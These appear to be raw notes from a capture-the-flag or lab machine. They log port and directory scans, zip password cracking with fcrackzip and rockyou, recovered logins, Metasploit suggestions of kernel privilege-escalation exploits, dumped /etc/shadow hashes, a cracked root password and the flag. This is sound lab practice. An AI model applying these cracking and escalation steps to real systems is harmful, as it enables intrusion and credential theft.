# our IP: 172.16.48.133

# taget ip: 172.16.10.173
# 22/tcp
# 80/tcp
# 8080/tcp

# dirb scan
# http://172.16.10.173:8080/docs (CODE:302|SIZE:0)
# http://172.16.10.173:8080/examples (CODE:302|SIZE:0)
# http://172.16.10.173:8080/favicon.ico (CODE:200|SIZE:21630)
# http://172.16.10.173:8080/host-manager (CODE:302|SIZE:0)
# http://172.16.10.173:8080/manager (CODE:302|SIZE:0)

# http://172.16.10.173/index.html (CODE:200|SIZE:10918)
# http://172.16.10.173/server-status (CODE:403|SIZE:278)

# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
# => @administrator_hi5

# admin => (melehifokivai)

# jaye => melehifokivai

# qkM|iwG\[k

# [*] 172.16.10.173 - Collecting local exploits for java/linux...
# /usr/share/metasploit-framework/modules/exploits/linux/local/sock_sendpage.rb:47: warning: key "Notes" is duplicated and overwritten on line 68
# /usr/share/metasploit-framework/modules/exploits/unix/webapp/phpbb_highlight.rb:46: warning: key "Notes" is duplicated and overwritten on line 51
# /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
# You can add syslog to your Gemfile or gemspec to silence this warning.
# Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
# [*] 172.16.10.173 - 205 exploit checks are being tried...
# [+] 172.16.10.173 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0
# [+] 172.16.10.173 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
# [+] 172.16.10.173 - exploit/linux/local/cve_2023_0386_overlayfs_priv_esc: The target appears to be vulnerable. Linux kernel version found: 5.15.0
# [+] 172.16.10.173 - exploit/linux/local/netfilter_nft_set_elem_init_privesc: The target appears to be vulnerable.
# [+] 172.16.10.173 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
# [+] 172.16.10.173 - exploit/linux/local/pkexec: The service is running, but could not be validated.
# [+] 172.16.10.173 - exploit/linux/local/su_login: The target appears to be vulnerable.
# [*] Running check method for exploit 73 / 73
# [*] 172.16.10.173 - Valid modules for session 1:
# ============================

#  #   Name                                                                Potentially Vulnerable?  Check Result
#  -   ----                                                                -----------------------  ------------
#  1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
#  2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
#  3   exploit/linux/local/cve_2023_0386_overlayfs_priv_esc                Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
#  4   exploit/linux/local/netfilter_nft_set_elem_init_privesc             Yes                      The target appears to be vulnerable.
#  5   exploit/linux/local/network_manager_vpnc_username_priv_esc          Yes                      The service is running, but could not be validated.
#  6   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
#  7   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.

# root /etc/shadow
# hash = randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/
# hash = root:$6$Z3if2A7RY48GUib.$Y/gW3rzt8MOddrJ6O0MfJr/EFHVsVuDbP6POJ/7hSem3X/KOjIavhxr77q4Er41LISWQ0qSxTAQUR83/1VjU/.

# root => abcd
# CTF => 2fdbf8d4f894292361d6c72c8e833a4b
